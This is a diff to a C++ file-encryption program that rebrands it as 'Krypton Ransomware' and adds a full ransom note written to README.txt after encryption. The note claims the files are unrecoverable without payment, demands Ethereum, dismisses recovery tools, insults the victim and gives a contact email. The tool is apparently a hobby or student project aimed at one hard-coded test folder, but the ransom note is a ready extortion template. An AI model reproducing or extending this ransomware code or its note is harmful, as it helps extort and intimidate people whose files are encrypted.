@@ -11,6 +11,28 @@
 auto main() -> int {
     unsigned int key[4] = { 0xFACE, 0xDEAD, 0xBABE, 0xD00D };
     std::string path = "/home/draco/TobeEncrypted";
+    auto write = std::fstream("/home/draco/TobeEncrypted/README.txt", std::ios::out | std::ios::trunc);
+    auto message = std::string("No English? Use -> https://translate.google.com/\n\n"
+                                  "What happened to your files?\n"
+                                  "All of your files were protected with XTEA (an encryption algorithm)\n"
+                                  "More info about XTEA can be found here -> https://en.wikipedia.org/wiki/XTEA\n\n"
+                                  "How did this happen?\n"
+                                  "Specially, your PC was generated personal and private key.\n"
+                                  "All your files has been encrypted with the public key\n"
+                                  "Decryption of your files is only possible with the help of the private key,\n"
+                                  "and the special decrypt program, which is on our secret server\n\n"
+                                  "What should I do?\n"
+                                  "So, there are two ways you can choose -> wait for a miracle and double your ransom price,\n"
+                                  "or start learning how to obtain and use ETH(etherium).\n"
+                                  "If you have really valuable data, you better not waste your time,\n"
+                                  "Because there is no other way to get your files back, except from paying the ransom\n"
+                                  "Photorec, Rannoh Decryptor, and repair tools are useless and will destroy your data\n"
+                                  "Don't be a moron\n\n"
+                                  "For more specific instructions\n\n"
+                                  "Contact info -> ramizna@code.edu.az\n"
+                                  "For proofing, send two of the encrypted files to the email and\n"
+                                  "I will decrypt it and send it back. Do not send any backup or valuable info.\n"
+                                  "I won't decrypt those things.");
 
     bool main_loop = true;
     int user_input;
@@ -69,9 +91,10 @@ auto main() -> int {
 
                         //Close file
                         file.close();
-                        std::cout << "Closing file" << std::endl;
+                        std::cout << "Closing file\n" << std::endl;
                     }
                 }
+                write << message << std::endl;
                 break;
 
             case 2:
@@ -138,7 +161,11 @@ auto main() -> int {
 }
 
 auto main_menu() -> void {
-    std::cout << "[1] Encrypt" << std::endl;
-    std::cout << "[2] Decrypt" << std::endl;
-    std::cout << "[0] Exit" << std::endl;
+    std::cout << "==================================================|\n";
+    std::cout << "               Krypton Ransomware                 |\n";
+    std::cout << "==================================================|\n";
+    std::cout << "[1] Encrypt                                       |\n";
+    std::cout << "[2] Decrypt                                       |\n";
+    std::cout << "[0] Exit                                          |\n";
+    std::cout << "==================================================|\n";
 }
